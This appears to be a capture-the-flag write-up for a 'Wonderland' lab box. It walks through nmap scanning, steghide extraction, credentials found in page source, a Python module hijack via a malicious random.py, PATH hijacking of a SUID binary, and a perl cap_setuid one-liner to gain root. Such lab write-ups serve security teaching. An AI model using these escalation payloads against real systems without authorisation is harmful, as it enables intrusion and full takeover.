# Enumeration

Starting out with nmap
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 14:24 IST
Nmap scan report for 10.10.167.17
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.02 seconds
```

### Port 80
Looking at the webpage, we found nothing interesting
  
![image](https://user-images.githubusercontent.com/43528306/122667086-a9f7f580-d1ce-11eb-87c3-88dff5cf73ef.png)

We had noting else, so looking at the image file. It might be some kind of stego. So lets download the file and check it.
```bash
  steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
We have a `hint.txt` file, with contents: `follow the r a b b i t`. 
  
After running directory scan, we found */r*, and as per the hint we can try */r/a/b/b/i/t*
Looking at the source code of the file, we got the credentials
  ```
  alice:HowDothTheLittleCrocodileImproveHisShiningTail
  ```
  
## Alice
Lets ssh into the box using the creds we found
```bash
alice@wonderland:~$ ls -l
total 8
-rw------- 1 root root   66 May 25 17:08 root.txt
-rw-r--r-- 1 root root 3577 May 25 02:43 walrus_and_the_carpenter.py
```
Checking the sudo permissions
```bash
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
 So we can run the python script as user `rabbit`. Lets look at the contents of script
 ```python
 import random
 
 poem="""
 ...[snip]...
 """
 for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
 ```
 
 It seems like we can't do anything here as we don't have write access to file so we can't modify it. After looking at lot at other places in search of passwords or some kind of priv-esc, we found nothing.
 Coming back to script, we saw its importing `random` module. We can check the path of modules using
 ```python
 >> import sys
 >> sys.path
 ['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
 ```
 
 Looking at it, first value seems empty, means its checking in current directory first. So we can *hijack* the library.
 
 > When python looks for libraries/scripts to import it checks local directory first, then additional packages and finally base libraries

We can create our python script with name `random.py`
```python
import os
os.system('/bin/bash')
```

So when we run the script, python import our malicious `random.py` and we get the shell as *rabbit*.

## Rabbit
Looking in the home directory of rabbit, we found
```bash
rabbit@wonderland:/home/rabbit$ ls -l
total 20
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
```
*Strings* binary was not present on the box, so to analyze it, lets transfer it to our box.
Running strings on binary
```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

It was using `echo` was called with absolue path but `date` was not. Means we can use *Path Hijacking* to execute command.
Lets make a file named `date`
```bash
#!/bin/bash
bash -p
```

*I first tried using chmod +xs /bin/bash, but it throwed error: permission denied. I found that the binary was also setting uid to 1003, which was hatter user. This make sense now*

Run the binary with our *date* file 
```bash
rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```
We got shell as hatter

## Hatter
Looking at home directory
```bash
hatter@wonderland:/home/hatter$id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

hatter@wonderland:/home/hatter$ls -l
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
```

## Root
We can now login as *hatter*. Running linpeas, we found
```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
```bash
ls -la /usr/bin/perl /usr/bin/perl5.26.1
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1
```

Both binaries are owned by root and hatter group. As we are hatter, we can easily run these
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

And we are root.

 
